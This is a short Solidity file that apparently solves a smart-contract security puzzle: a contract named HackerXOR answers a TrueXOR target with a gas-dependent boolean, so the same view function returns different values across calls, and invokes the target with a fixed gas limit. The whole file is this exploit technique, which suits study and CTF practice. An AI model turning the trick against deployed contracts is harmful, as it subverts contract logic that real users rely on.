// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TrueXOR,IBoolGiver} from "./XOR.sol";

contract HackerXOR is IBoolGiver{
    TrueXOR trueXor;
    constructor(address _trueXor){
        trueXor= TrueXOR(_trueXor);
    }   
    function giveBool() external view override returns (bool){
        return gasleft()>=2600;
    }

    function callMe() public view returns(bool) {
        return trueXor.callMe{gas:10000}(address(this));
    }
}